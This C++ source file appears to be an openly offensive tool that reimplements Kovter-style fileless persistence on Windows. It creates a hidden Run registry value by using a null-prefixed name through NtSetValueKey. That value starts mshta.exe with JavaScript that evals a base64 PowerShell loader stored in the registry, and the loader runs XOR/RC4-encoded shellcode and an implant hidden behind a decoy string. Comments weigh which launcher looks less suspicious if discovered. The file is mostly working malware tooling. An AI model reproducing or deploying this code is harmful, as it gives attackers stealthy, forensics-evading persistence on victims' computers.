// kovterComLnk.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#include "ntdll.h"
#include <stdint.h>
#include <time.h>
#include "InvisibleRegKeys.h"

int main(int argc, char *argv[]) {
	char fullKeyPath[0x100] = { 0 };
	char decoy[] = "(value not set)";
	char keyName[] = "WUV";
	char valueName[] = "Tethering";

	bool bError = false;
	if (argc > 1) {
		if (!strcmp(argv[1], "unpersist")) {
			deleteHiddenRunKey();
			deleteHiddenBuffer(keyName, valueName);
		}
		else if (!strcmp(argv[1], "persist")) {
			if (argc != 3)
				bError = true;
			else
				persist(decoy, keyName, valueName, argv[2]);
		}
	}
	else
		bError = true;

	if (bError) {
		printf("Usage: %s [persist|unpersist] [.exe path if persist]\n", argv[0]);
	}
	return 0;
}

void deleteHiddenBuffer(char *keyName, char *valueName) {
	HKEY hkResult = NULL;
	char fullKeyPath[0x100] = { 0 };
	snprintf(fullKeyPath, 0x100, "SOFTWARE\\%s", keyName);
	if (!RegOpenKeyExA(HKEY_CURRENT_USER, fullKeyPath, 0, KEY_SET_VALUE, &hkResult)) {
		RegDeleteValueA(hkResult, valueName); //javascript with large b64 string
		RegDeleteValueA(hkResult, NULL); //encoded implant
		RegCloseKey(hkResult);
		RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE", 0, KEY_SET_VALUE, &hkResult);
		RegDeleteKeyA(hkResult, keyName); //encoded implant
		RegCloseKey(hkResult);
	}
}

void persist(char *decoy, char *keyName, char *valueName, char *implantPath) {
	char fullKeyPath[0x100] = { 0 };
	char mshtaCmd[0x300] = { 0 };
	WCHAR mshtaCmd_w[0x300] = { 0 };

	// construct the string that will be in the hidden run key
	snprintf(mshtaCmd, 0x300, "\"C:\\WINDOWS\\system32\\mshta.exe\" \"javascript:z1kHl=\"SiBZQ\";I6M2=new ActiveXObject(\"WScript.Shell\");qs0Nn=\"2BEh4hFR\";lEgt9=I6M2.RegRead(\"HKCU\\\\software\\\\%s\\\\%s\");dpP1iXav=\"hX9bkPRH\";eval(lEgt9);nro9M=\"ioQzi30v\";\"", keyName, valueName);

	// Create the Hidden run key that points to SOFTWARE\WUV\TETHERING
	mbstowcs(mshtaCmd_w, mshtaCmd, 0x300);
	createHiddenRunKey(mshtaCmd_w);

	// At this point the value SOFTWARE\WUV\TETHERING should contain a javascript script
	// The default value of SOFTWARE\WUV\ should be a hidden implant buffer
	snprintf(fullKeyPath, 0x100, "SOFTWARE\\%s", keyName);
	HKEY hKey = OpenKey(HKEY_CURRENT_USER, fullKeyPath);
	char *tetheringBuf = constructTetheringBuffer(decoy, fullKeyPath, valueName, implantPath);

	// write tetheringBuf to WUV\Tethering
	SetStrVal(hKey, valueName, (unsigned char*)tetheringBuf, strlen(tetheringBuf));
}

char *constructTetheringBuffer(char *decoy, char *key, char *value, char *implantPath) {
	char *implant = NULL;
	DWORD implantLen = 0;
	BYTE xorKey[31] = { 0 };
	DWORD xorKeySize = 30;

	// Generate the random XOR key that encodes the cleartext implant and is burned into the shellcode
	srand((unsigned int)time(NULL));
	for (DWORD i = 0; i < xorKeySize; i++) {
		xorKey[i] = rand() % 256;
	}

	// get clear text implant buf
	if (readFile((const char *)implantPath, &implant, &implantLen)) {
		printf("Error reading implant!\n");
		exit(1);
	}

	// fixup shellcode. the decoy string can be variable length, and needs to be changed a couple places in the shellcode
	if (memcmp(sc + 0x6A6, "\x83\xC0\x52", 3) || memcmp(sc + 0x696, "\x83\xE8\x52", 3)) {
		printf("Shellcode is formatted in an unexpected way (offsets for decoy string fixup are incorrect!\n");
		exit(1);
	}
	sc[0x698] = (unsigned char)(strlen(decoy) + 1);
	sc[0x6A8] = (unsigned char)(strlen(decoy) + 1);
	if (sizeof(sc) < SC_SIZE_OF_CODE) {
		printf("sizeof(sc) is shorter than expected!\n");
		exit(1);
	}

	BYTE *sc_fixup = (BYTE*)malloc(SC_TOTAL_SIZE);
	memset(sc_fixup, 0, SC_TOTAL_SIZE);
	memcpy(sc_fixup, sc, SC_SIZE_OF_CODE);

	strcpy((char*)&sc_fixup[SC_SIZE_OF_CODE], key);
	if (NULL == value) {
		strcpy((char*)&sc_fixup[0xA89], "none");
	}
	else {
		strcpy((char*)&sc_fixup[0xA89], value);
	}
	memcpy(&sc_fixup[0xA9A], xorKey, xorKeySize);
	wcscpy((WCHAR*)&sc_fixup[0xAC0], L"none");
	((DWORD*)sc_fixup)[0xB24 / sizeof(DWORD)] = xorKeySize;
	((DWORD*)sc_fixup)[0xB28 / sizeof(DWORD)] = implantLen;
	// copy the memcpy function
	memcpy(sc_fixup + 0xB2C, sc + 0xB2C, 0x14);

	char *sc_powershell = convertBinaryToPowershellByteArray(sc_fixup, SC_TOTAL_SIZE);

	printf("\n\n=====sc_powershell======\n\n");
	printf(sc_powershell);

	// construct the powershell buffer
	size_t pBufSize = sizeof(powershell_inner) + strlen(sc_powershell) + sizeof(powershell_inner2) + 1;
	char *pBuf = (char*)malloc(pBufSize);
	memset(pBuf, 0, pBufSize);
	strcat(pBuf, powershell_inner);
	strcat(pBuf, sc_powershell);
	strcat(pBuf, powershell_inner2);
	printf("\n\n=====pBuf======\n\n");
	printf(pBuf);

	printf("\n\n=====BASE64======\n\n");
	size_t b64_size = 0;
	char *b64_buf = base64_encode((const unsigned char *)pBuf, pBufSize, &b64_size);
	printf(b64_buf);

	size_t jsSize = sizeof(TetheringValue) + strlen(b64_buf) + sizeof(TetheringValue2) + 1;
	char *jsBuf = (char*)malloc(jsSize);
	memset(jsBuf, 0, jsSize);
	strcat(jsBuf, TetheringValue);
	strcat(jsBuf, b64_buf);
	strcat(jsBuf, TetheringValue2);
	printf("\n\n=====jsBuf======\n\n");
	printf(jsBuf);

	unsigned char *implantEncoded = xorEncodeDecode((unsigned char*)implant, implantLen, xorKey, xorKeySize);
	// writes the implant to the default value of key (HKCU\SOFTWARE\WUV)
	writeHiddenBuf((char*)implantEncoded, implantLen, decoy, key, NULL);

	free(pBuf);
	free(sc_powershell);
	free(b64_buf);
	free(implant);
	free(implantEncoded);
	free(sc_fixup);

	return jsBuf;
}

HKEY OpenKey(HKEY hRootKey, char* strKey) {
	HKEY hKey;
	LONG nError = RegOpenKeyExA(hRootKey, strKey, NULL, KEY_ALL_ACCESS, &hKey);

	if (nError == ERROR_FILE_NOT_FOUND)
	{
		printf("Creating registry key: %s\n", strKey);
		nError = RegCreateKeyExA(hRootKey, strKey, NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	}

	if (nError)
		printf("Error: %d. Could not find or create %s\n", nError, strKey);
	return hKey;
}

void SetStrVal(HKEY hKey, char *lpValue, unsigned char *buf, UINT cbBuf) {
	LONG nError = RegSetValueExA(hKey, lpValue, NULL, REG_SZ, buf, cbBuf);
	if (nError)
		printf("Error: %d. Could not set registry value: %s\n", nError, lpValue);
}

char *convertBinaryToPowershellByteArray(BYTE *buf, DWORD bufLen) {
	char *out = (char*)malloc((bufLen * 5) + 1);
	memset(out, 0, (bufLen * 5) + 1);
	DWORD outLen = 0;
	for (DWORD i = 0; i < bufLen; i++) {
		snprintf(&out[i * 5], 6, "0x%.02X,", buf[i]);
	}
	// overwrite the final comma with a NULL byte
	out[(bufLen * 5) - 1] = 0;
	return out;
}


unsigned char *xorEncodeDecode(unsigned char *buf, ULONG bufLen, unsigned char *key, ULONG keyLen) {
	unsigned char *result = (unsigned char*)malloc(bufLen);
	memcpy(result, buf, bufLen);
	int table_256[256] = { 0 };
	for (ULONG i = 0; i < 256; i++) {
		table_256[i] = i;
	}
	int muddle = 0;
	for (ULONG i = 0; i < 256; i++) {
		muddle = key[i % keyLen] + table_256[i] + muddle;
		muddle %= 256;
		int swap = table_256[i];
		table_256[i] = table_256[muddle];
		table_256[muddle] = swap;
	}

	int muddle2 = 0;
	int counter = 0;
	for (ULONG i = 0; i < bufLen; i++) {
		counter += 1;
		counter %= 256;
		muddle2 = table_256[counter] + muddle2;
		muddle2 %= 256;
		int swap2 = table_256[counter];
		table_256[counter] = table_256[muddle2];
		table_256[muddle2] = swap2;
		result[i] ^= table_256[(table_256[counter] + table_256[muddle2]) % 256];
	}
	return result;
}

// HIDDEN_KEY_LENGTH doesn't matter as long as it is non-zero.
// Length is needed to delete the key
#define HIDDEN_KEY_LENGTH 11
void createHiddenRunKey(const WCHAR* runCmd) {
	LSTATUS  openRet = 0;
	NTSTATUS setRet = 0;
	HKEY hkResult = NULL;
	UNICODE_STRING ValueName = { 0 };
	wchar_t runkeyPath[0x100] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	wchar_t runkeyPath_trick[0x100] = L"\0\0SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	if (!NtSetValueKey) {
		HMODULE hNtdll = LoadLibraryA("ntdll.dll");
		NtSetValueKey = (_NtSetValueKey)GetProcAddress(hNtdll, "NtSetValueKey");
	}

	ValueName.Buffer = runkeyPath_trick;
	ValueName.Length = 2 * HIDDEN_KEY_LENGTH;
	ValueName.MaximumLength = 0;

	if (!(openRet = RegOpenKeyExW(HKEY_CURRENT_USER, runkeyPath, 0, KEY_SET_VALUE, &hkResult))) {
		if (!(setRet = NtSetValueKey(hkResult, &ValueName, 0, REG_SZ, (PVOID)runCmd, wcslen(runCmd) * 2)))
			printf("SUCCESS setting hidden run value!\n");
		else
			printf("FAILURE setting hidden run value! (setRet == 0x%X, GLE() == %d)\n", setRet, GetLastError());
		RegCloseKey(hkResult);
	}
	else {
		printf("FAILURE opening RUN key in registry! (openRet == 0x%X, GLE() == %d)\n", openRet, GetLastError());
	}
}

void deleteHiddenRunKey() {
	UNICODE_STRING ValueName = { 0 };
	wchar_t runkeyPath[0x100] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	wchar_t runkeyPath_trick[0x100] = L"\0\0SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	if (!NtDeleteValueKey) {
		HMODULE hNtdll = LoadLibraryA("ntdll.dll");
		NtDeleteValueKey = (_NtDeleteValueKey)GetProcAddress(hNtdll, "NtDeleteValueKey");
	}

	ValueName.Buffer = runkeyPath_trick;
	ValueName.Length = 2 * HIDDEN_KEY_LENGTH; //this value doesn't matter as long as it is non-zero
	ValueName.MaximumLength = 0;

	HKEY hkResult = NULL;
	if (!RegOpenKeyExW(HKEY_CURRENT_USER, runkeyPath, 0, KEY_SET_VALUE, &hkResult)) {
		if (!NtDeleteValueKey(hkResult, &ValueName)) {
			printf("SUCCESS deleting hidden run value in registry!\n");
		}
		RegCloseKey(hkResult);
	}
}

// this writes the binary buffer of the encoded implant to the registry as a sting
// according to winnt.h, REG_SZ is "Unicode nul terminated string"
// When the value is exported, only part of the value will actually be exported.
void writeHiddenBuf(char *buf, DWORD buflen, const char *decoy, char *keyName, const char* valueName) {
	HKEY hkResult = NULL;
	BYTE *buf2 = (BYTE*)malloc(buflen + strlen(decoy) + 1);
	strcpy((char*)buf2, decoy);
	buf2[strlen(decoy)] = 0;
	memcpy(buf2 + strlen(decoy) + 1, buf, buflen);

	if (!RegOpenKeyExA(HKEY_CURRENT_USER, keyName, 0, KEY_SET_VALUE, &hkResult))
	{
		printf("Key opened!\n");
		LSTATUS lStatus = RegSetValueExA(hkResult, valueName, 0, REG_SZ, (const BYTE *)buf2, buflen + strlen(decoy) + 1);
		printf("lStatus == %d\n", lStatus);
		RegCloseKey(hkResult);
	}
	free(buf2);
}

void readHiddenBuf(BYTE **buf, DWORD *buflen, const char *decoy, char * keyName, const char* valueName) {
	HKEY hkResult = NULL;
	LONG nError = RegOpenKeyExA(HKEY_CURRENT_USER, keyName, NULL, KEY_ALL_ACCESS, &hkResult);
	RegQueryValueExA(hkResult, valueName, NULL, NULL, NULL, buflen);
	*buf = (BYTE*)malloc(*buflen);
	RegQueryValueExA(hkResult, valueName, NULL, NULL, *buf, buflen);
	RegCloseKey(hkResult);
	*buflen -= (strlen(decoy) + 1);
	BYTE *buf2 = (BYTE*)malloc(*buflen);
	memcpy(buf2, *buf + strlen(decoy) + 1, *buflen);
	free(*buf);
	*buf = buf2;
}

int readFile(const char *path, char **buf, DWORD *buflen) {
	HANDLE hFile = CreateFileA(path,               // file to open
		GENERIC_READ,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_EXISTING,         // existing file only
		FILE_ATTRIBUTE_NORMAL, // normal file
		NULL);                 // no attr. template

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Couldn't open the dll file from diks!\n");
		return 1;
	}

	*buflen = GetFileSize(hFile, NULL);
	printf("filesize 0x%X\n", *buflen);
	if (INVALID_FILE_SIZE == *buflen) {
		printf("Couldn't get the file size!\n");
		return 1;
	}

	*buf = (char*)malloc(*buflen);
	DWORD bytesRead = 0;

	if (FALSE == ReadFile(hFile, *buf, *buflen, &bytesRead, NULL))
	{
		printf("Terminal failure: Unable to read from file.\n GetLastError=%08x\n", GetLastError());
		CloseHandle(hFile);
		return 1;
	}

	if (bytesRead != *buflen) {
		printf("Error! Only read %d bytes out of %d!\n", bytesRead, *buflen);
		return 1;
	}
	return 0;
}

// can be used to create a LNK file for the autorun key.
// Design choice. Depends on whether a LNK file or mshta.exe with a long javascript
//   command line looks more malicious if the hidden autorun value is discovered.
void createLnkFile() {
	IUnknown *pUnk;
	IShellLinkW*   pISL;
	IPersistFile* pIPF;
	HRESULT hr = NULL;
	WCHAR pathToCmd[] = L"C:\\Users\\lowuser\\Desktop\\tmp\\innocent.bat";
	WCHAR argsToCmd[4] = { 0 };
	WCHAR directory[] = L"C:\\Users\\lowuser\\Desktop\\tmp";
	WCHAR lnkDest[] = L"C:\\Users\\lowuser\\Desktop\\tmp\\innocentShortcut.lnk";

	CoInitialize(NULL);

	hr = CoCreateInstance(CLSID_ShellLink, 0, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER, IID_IUnknown, (void**)&pUnk);
	if (SUCCEEDED(hr)) {
		pUnk->QueryInterface(IID_IShellLinkW, (void**)&pISL);
		pUnk->QueryInterface(IID_IPersistFile, (void**)&pIPF);
		if (NULL == pISL || NULL == pIPF) {
			printf("Error! Exit\n");
			exit(1);
		}
		pISL->SetPath(pathToCmd);
		pISL->SetArguments(argsToCmd);
		pISL->SetWorkingDirectory(directory);
		pISL->SetShowCmd(SW_SHOWMINNOACTIVE);
		pIPF->Save(lnkDest, 0);
	}
}

// md5 code from https://gist.github.com/jcppython/ad4d957ab66cf5b4aa3732662395fd6b

// leftrotate function definition
#define LEFTROTATE(x, c) (((x) << (c)) | ((x) >> (32 - (c))))


char *md5(char *initial_msg, size_t initial_len) {
	// These vars will contain the hash
	uint32_t h0, h1, h2, h3;

	// Message (to prepare)
	uint8_t *msg = NULL;

	// Note: All variables are unsigned 32 bit and wrap modulo 2^32 when calculating

	// r specifies the per-round shift amounts

	uint32_t r[] = { 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
		5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
		4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
		6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21 };

	// Use binary integer part of the sines of integers (in radians) as constants// Initialize variables:
	uint32_t k[] = {
		0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
		0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
		0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
		0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
		0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
		0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
		0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
		0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
		0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
		0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
		0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
		0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
		0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
		0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
		0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
		0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 };

	h0 = 0x67452301;
	h1 = 0xefcdab89;
	h2 = 0x98badcfe;
	h3 = 0x10325476;

	// Pre-processing: adding a single 1 bit
	//append "1" bit to message    
	/* Notice: the input bytes are considered as bits strings,
	where the first bit is the most significant bit of the byte.[37] */

	// Pre-processing: padding with zeros
	//append "0" bit until message length in bit ≡ 448 (mod 512)
	//append length mod (2 pow 64)  to message

	int new_len;
	for (new_len = initial_len * 8 + 1; new_len % 512 != 448; new_len++);
	new_len /= 8;

	msg = (uint8_t*)malloc(new_len + 64); // also appends "0" bits 
										  // (we alloc also 64 extra bytes...)
	memset(msg, 0, new_len + 64);
	memcpy(msg, initial_msg, initial_len);
	msg[initial_len] = 128; // write the "1" bit

	uint32_t bits_len = 8 * initial_len; // note, we append the len
	memcpy(msg + new_len, &bits_len, 4);           // in bits at the end of the buffer

												   // Process the message in successive 512-bit chunks:
												   //for each 512-bit chunk of message:
	int offset;
	for (offset = 0; offset<new_len; offset += (512 / 8)) {

		// break chunk into sixteen 32-bit words w[j], 0 ≤ j ≤ 15
		uint32_t *w = (uint32_t *)(msg + offset);

		// Initialize hash value for this chunk:
		uint32_t a = h0;
		uint32_t b = h1;
		uint32_t c = h2;
		uint32_t d = h3;

		// Main loop:
		uint32_t i;
		for (i = 0; i<64; i++) {

			uint32_t f, g;

			if (i < 16) {
				f = (b & c) | ((~b) & d);
				g = i;
			}
			else if (i < 32) {
				f = (d & b) | ((~d) & c);
				g = (5 * i + 1) % 16;
			}
			else if (i < 48) {
				f = b ^ c ^ d;
				g = (3 * i + 5) % 16;
			}
			else {
				f = c ^ (b | (~d));
				g = (7 * i) % 16;
			}

			uint32_t temp = d;
			d = c;
			c = b;
			b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);
			a = temp;



		}

		// Add this chunk's hash to result so far:

		h0 += a;
		h1 += b;
		h2 += c;
		h3 += d;

	}
	char *result = (char*)malloc(33);
	memset(result, 0, 33);
	//var char digest[16] := h0 append h1 append h2 append h3 //(Output is in little-endian)
	uint8_t *p;

	char tmp[9] = { 0 };
	// display result

	p = (uint8_t *)&h0;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);

	p = (uint8_t *)&h1;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);

	p = (uint8_t *)&h2;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);

	p = (uint8_t *)&h3;
	snprintf(tmp, 9, "%2.2X%2.2X%2.2X%2.2X", p[0], p[1], p[2], p[3]);
	strcat(result, tmp);

	if (strlen(result) > 32) {
		printf("ERROR IN MD5! strlen is %d, not 32! %s\n", strlen(result), result);
		exit(1);
	}
	// cleanup
	free(msg);
	return result;
}


// base 64 code from https://www.mycplus.com/source-code/c-source-code/base64-encode-decode/
static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
'w', 'x', 'y', 'z', '0', '1', '2', '3',
'4', '5', '6', '7', '8', '9', '+', '/' };
static char *decoding_table = NULL;
static int mod_table[] = { 0, 2, 1 };


void build_decoding_table() {

	decoding_table = (char *)malloc(256);
	memset(decoding_table, 0, 256);
	for (int i = 0; i < 64; i++)
		decoding_table[(unsigned char)encoding_table[i]] = i;
}


void base64_cleanup() {
	free(decoding_table);
}

char *base64_encode(const unsigned char *data,
	size_t input_length,
	size_t *output_length) {

	*output_length = 4 * ((input_length + 2) / 3);

	char *encoded_data = (char*)malloc(*output_length + 1);
	memset(encoded_data, 0, *output_length + 1);
	if (encoded_data == NULL) return NULL;

	for (size_t i = 0, j = 0; i < input_length;) {

		uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
		uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

		uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

		encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
	}

	for (int i = 0; i < mod_table[input_length % 3]; i++)
		encoded_data[*output_length - 1 - i] = '=';
	encoded_data[*output_length] = 0;
	return encoded_data;
}


unsigned char *base64_decode(const char *data,
	size_t input_length,
	size_t *output_length) {

	if (decoding_table == NULL) build_decoding_table();

	if (input_length % 4 != 0) return NULL;

	*output_length = input_length / 4 * 3;
	if (data[input_length - 1] == '=') (*output_length)--;
	if (data[input_length - 2] == '=') (*output_length)--;

	unsigned char *decoded_data = (unsigned char*)malloc(*output_length);
	memset(decoded_data, 0, *output_length);
	if (decoded_data == NULL) return NULL;

	for (size_t i = 0, j = 0; i < input_length;) {

		uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

		uint32_t triple = (sextet_a << 3 * 6)
			+ (sextet_b << 2 * 6)
			+ (sextet_c << 1 * 6)
			+ (sextet_d << 0 * 6);

		if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
	}

	return decoded_data;
}
